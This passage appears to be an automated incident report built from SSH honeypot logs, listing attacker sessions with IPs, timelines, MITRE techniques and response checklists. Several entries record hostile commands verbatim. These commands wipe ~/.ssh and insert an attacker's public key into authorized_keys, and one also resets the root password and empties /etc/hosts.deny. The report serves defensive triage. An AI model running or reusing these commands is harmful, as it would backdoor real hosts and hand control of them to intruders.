| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:19 |
| **Last Seen** | 2026-05-31 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:19:41` | `cowrie.session.connect` |
| `2026-05-31 14:19:41` | `cowrie.client.version` |
| `2026-05-31 14:19:42` | `cowrie.client.kex` |
| `2026-05-31 14:19:42` | `cowrie.login.success` |
| `2026-05-31 14:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee096456e62

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:21 |
| **Last Seen** | 2026-05-31 14:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:21:21` | `cowrie.session.connect` |
| `2026-05-31 14:21:21` | `cowrie.client.version` |
| `2026-05-31 14:21:21` | `cowrie.client.kex` |
| `2026-05-31 14:21:22` | `cowrie.login.success` |
| `2026-05-31 14:21:22` | `cowrie.session.params` |
| `2026-05-31 14:21:22` | `cowrie.command.input` |
| `2026-05-31 14:21:22` | `cowrie.command.failed` |
| `2026-05-31 14:21:22` | `cowrie.log.closed` |
| `2026-05-31 14:21:23` | `cowrie.session.params` |
| `2026-05-31 14:21:23` | `cowrie.command.input` |
| `2026-05-31 14:21:23` | `cowrie.session.file_download` |
| `2026-05-31 14:21:23` | `cowrie.log.closed` |
| `2026-05-31 14:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2091c23dd206

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:21 |
| **Last Seen** | 2026-05-31 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:21:25` | `cowrie.session.connect` |
| `2026-05-31 14:21:25` | `cowrie.client.version` |
| `2026-05-31 14:21:25` | `cowrie.client.kex` |
| `2026-05-31 14:21:26` | `cowrie.login.success` |
| `2026-05-31 14:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74d7b2bae9d

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:22 |
| **Last Seen** | 2026-05-31 14:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:22:09` | `cowrie.session.connect` |
| `2026-05-31 14:22:09` | `cowrie.client.version` |
| `2026-05-31 14:22:09` | `cowrie.client.kex` |
| `2026-05-31 14:22:10` | `cowrie.login.success` |
| `2026-05-31 14:22:10` | `cowrie.session.params` |
| `2026-05-31 14:22:10` | `cowrie.command.input` |
| `2026-05-31 14:22:10` | `cowrie.command.failed` |
| `2026-05-31 14:22:10` | `cowrie.log.closed` |
| `2026-05-31 14:22:11` | `cowrie.session.params` |
| `2026-05-31 14:22:11` | `cowrie.command.input` |
| `2026-05-31 14:22:11` | `cowrie.session.file_download` |
| `2026-05-31 14:22:11` | `cowrie.log.closed` |
| `2026-05-31 14:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf314f690e7

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:22 |
| **Last Seen** | 2026-05-31 14:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:22:13` | `cowrie.session.connect` |
| `2026-05-31 14:22:13` | `cowrie.client.version` |
| `2026-05-31 14:22:13` | `cowrie.client.kex` |
| `2026-05-31 14:22:14` | `cowrie.login.success` |
| `2026-05-31 14:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-976549768399

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:22 |
| **Last Seen** | 2026-05-31 14:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:22:55` | `cowrie.session.connect` |
| `2026-05-31 14:22:55` | `cowrie.client.version` |
| `2026-05-31 14:22:55` | `cowrie.client.kex` |
| `2026-05-31 14:22:55` | `cowrie.login.success` |
| `2026-05-31 14:22:56` | `cowrie.session.params` |
| `2026-05-31 14:22:56` | `cowrie.command.input` |
| `2026-05-31 14:22:56` | `cowrie.command.failed` |
| `2026-05-31 14:22:56` | `cowrie.log.closed` |
| `2026-05-31 14:22:56` | `cowrie.session.params` |
| `2026-05-31 14:22:56` | `cowrie.command.input` |
| `2026-05-31 14:22:56` | `cowrie.session.file_download` |
| `2026-05-31 14:22:56` | `cowrie.log.closed` |
| `2026-05-31 14:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8428a23c9359

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:22 |
| **Last Seen** | 2026-05-31 14:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:22:59` | `cowrie.session.connect` |
| `2026-05-31 14:22:59` | `cowrie.client.version` |
| `2026-05-31 14:22:59` | `cowrie.client.kex` |
| `2026-05-31 14:22:59` | `cowrie.login.success` |
| `2026-05-31 14:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b8bcd1ac09c

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:23 |
| **Last Seen** | 2026-05-31 14:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:23:41` | `cowrie.session.connect` |
| `2026-05-31 14:23:41` | `cowrie.client.version` |
| `2026-05-31 14:23:41` | `cowrie.client.kex` |
| `2026-05-31 14:23:42` | `cowrie.login.success` |
| `2026-05-31 14:23:42` | `cowrie.session.params` |
| `2026-05-31 14:23:42` | `cowrie.command.input` |
| `2026-05-31 14:23:42` | `cowrie.command.failed` |
| `2026-05-31 14:23:42` | `cowrie.log.closed` |
| `2026-05-31 14:23:42` | `cowrie.session.params` |
| `2026-05-31 14:23:42` | `cowrie.command.input` |
| `2026-05-31 14:23:43` | `cowrie.session.file_download` |
| `2026-05-31 14:23:43` | `cowrie.log.closed` |
| `2026-05-31 14:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8805fcbd4ba

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:23 |
| **Last Seen** | 2026-05-31 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:23:45` | `cowrie.session.connect` |
| `2026-05-31 14:23:45` | `cowrie.client.version` |
| `2026-05-31 14:23:45` | `cowrie.client.kex` |
| `2026-05-31 14:23:46` | `cowrie.login.success` |
| `2026-05-31 14:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710101f5aff7

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:24 |
| **Last Seen** | 2026-05-31 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:24:26` | `cowrie.session.connect` |
| `2026-05-31 14:24:26` | `cowrie.client.version` |
| `2026-05-31 14:24:26` | `cowrie.client.kex` |
| `2026-05-31 14:24:27` | `cowrie.login.success` |
| `2026-05-31 14:24:27` | `cowrie.session.params` |
| `2026-05-31 14:24:27` | `cowrie.command.input` |
| `2026-05-31 14:24:27` | `cowrie.command.failed` |
| `2026-05-31 14:24:27` | `cowrie.log.closed` |
| `2026-05-31 14:24:28` | `cowrie.session.params` |
| `2026-05-31 14:24:28` | `cowrie.command.input` |
| `2026-05-31 14:24:28` | `cowrie.session.file_download` |
| `2026-05-31 14:24:28` | `cowrie.log.closed` |
| `2026-05-31 14:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaec43179783

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:24 |
| **Last Seen** | 2026-05-31 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:24:30` | `cowrie.session.connect` |
| `2026-05-31 14:24:30` | `cowrie.client.version` |
| `2026-05-31 14:24:30` | `cowrie.client.kex` |
| `2026-05-31 14:24:31` | `cowrie.login.success` |
| `2026-05-31 14:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956be5952e17

| Field | Detail |
|---|---|
| **Source IP** | `167.172.203[.]111` |
| **First Seen** | 2026-05-31 14:25 |
| **Last Seen** | 2026-05-31 14:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:25:35` | `cowrie.session.connect` |
| `2026-05-31 14:25:35` | `cowrie.client.version` |
| `2026-05-31 14:25:35` | `cowrie.client.kex` |
| `2026-05-31 14:25:36` | `cowrie.login.success` |
| `2026-05-31 14:25:37` | `cowrie.session.params` |
| `2026-05-31 14:25:37` | `cowrie.command.input` |
| `2026-05-31 14:25:37` | `cowrie.command.failed` |
| `2026-05-31 14:25:37` | `cowrie.log.closed` |
| `2026-05-31 14:25:38` | `cowrie.session.params` |
| `2026-05-31 14:25:38` | `cowrie.command.input` |
| `2026-05-31 14:25:38` | `cowrie.session.file_download` |
| `2026-05-31 14:25:38` | `cowrie.log.closed` |
| `2026-05-31 14:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.203[.]111` to AbuseIPDB if not already reported
- [ ] Block `167.172.203[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e21993b32f2

| Field | Detail |
|---|---|
| **Source IP** | `167.172.203[.]111` |
| **First Seen** | 2026-05-31 14:25 |
| **Last Seen** | 2026-05-31 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:25:41` | `cowrie.session.connect` |
| `2026-05-31 14:25:41` | `cowrie.client.version` |
| `2026-05-31 14:25:41` | `cowrie.client.kex` |
| `2026-05-31 14:25:42` | `cowrie.login.success` |
| `2026-05-31 14:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.203[.]111` to AbuseIPDB if not already reported
- [ ] Block `167.172.203[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4048363441d1

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-31 14:37 |
| **Last Seen** | 2026-05-31 14:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:37:12` | `cowrie.session.connect` |
| `2026-05-31 14:37:12` | `cowrie.client.version` |
| `2026-05-31 14:37:12` | `cowrie.client.kex` |
| `2026-05-31 14:37:13` | `cowrie.login.success` |
| `2026-05-31 14:37:13` | `cowrie.session.params` |
| `2026-05-31 14:37:13` | `cowrie.command.input` |
| `2026-05-31 14:37:13` | `cowrie.command.failed` |
| `2026-05-31 14:37:14` | `cowrie.log.closed` |
| `2026-05-31 14:37:14` | `cowrie.session.params` |
| `2026-05-31 14:37:14` | `cowrie.command.input` |
| `2026-05-31 14:37:14` | `cowrie.session.file_download` |
| `2026-05-31 14:37:14` | `cowrie.log.closed` |
| `2026-05-31 14:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2233f7682031

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-31 14:37 |
| **Last Seen** | 2026-05-31 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:37:16` | `cowrie.session.connect` |
| `2026-05-31 14:37:16` | `cowrie.client.version` |
| `2026-05-31 14:37:16` | `cowrie.client.kex` |
| `2026-05-31 14:37:17` | `cowrie.login.success` |
| `2026-05-31 14:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00ca9ac2ab45

| Field | Detail |
|---|---|
| **Source IP** | `203.195.64[.]232` |
| **First Seen** | 2026-05-31 14:50 |
| **Last Seen** | 2026-05-31 14:50 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:6cuYxQd9vIFV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:50:05` | `cowrie.session.connect` |
| `2026-05-31 14:50:06` | `cowrie.client.version` |
| `2026-05-31 14:50:06` | `cowrie.client.kex` |
| `2026-05-31 14:50:06` | `cowrie.login.success` |
| `2026-05-31 14:50:07` | `cowrie.session.params` |
| `2026-05-31 14:50:07` | `cowrie.command.input` |
| `2026-05-31 14:50:07` | `cowrie.command.failed` |
| `2026-05-31 14:50:07` | `cowrie.log.closed` |
| `2026-05-31 14:50:07` | `cowrie.session.params` |
| `2026-05-31 14:50:07` | `cowrie.command.input` |
| `2026-05-31 14:50:07` | `cowrie.session.file_download` |
| `2026-05-31 14:50:07` | `cowrie.log.closed` |
| `2026-05-31 14:50:23` | `cowrie.session.params` |
| `2026-05-31 14:50:23` | `cowrie.command.input` |
| `2026-05-31 14:50:24` | `cowrie.log.closed` |
| `2026-05-31 14:50:24` | `cowrie.session.params` |
| `2026-05-31 14:50:24` | `cowrie.command.input` |
| `2026-05-31 14:50:24` | `cowrie.log.closed` |
| `2026-05-31 14:50:24` | `cowrie.session.params` |
| `2026-05-31 14:50:24` | `cowrie.command.input` |
| `2026-05-31 14:50:25` | `cowrie.session.file_download` |
| `2026-05-31 14:50:25` | `cowrie.log.closed` |
| `2026-05-31 14:50:25` | `cowrie.session.params` |
| `2026-05-31 14:50:25` | `cowrie.command.input` |
| `2026-05-31 14:50:25` | `cowrie.log.closed` |
| `2026-05-31 14:50:25` | `cowrie.session.params` |
| `2026-05-31 14:50:25` | `cowrie.command.input` |
| `2026-05-31 14:50:25` | `cowrie.log.closed` |
| `2026-05-31 14:50:26` | `cowrie.session.params` |
| `2026-05-31 14:50:26` | `cowrie.command.input` |
| `2026-05-31 14:50:26` | `cowrie.command.input` |
| `2026-05-31 14:50:26` | `cowrie.log.closed` |
| `2026-05-31 14:50:26` | `cowrie.session.params` |
| `2026-05-31 14:50:26` | `cowrie.command.input` |
| `2026-05-31 14:50:26` | `cowrie.log.closed` |
| `2026-05-31 14:50:27` | `cowrie.session.params` |
| `2026-05-31 14:50:27` | `cowrie.command.input` |
| `2026-05-31 14:50:27` | `cowrie.log.closed` |
| `2026-05-31 14:50:27` | `cowrie.session.params` |
| `2026-05-31 14:50:27` | `cowrie.command.input` |
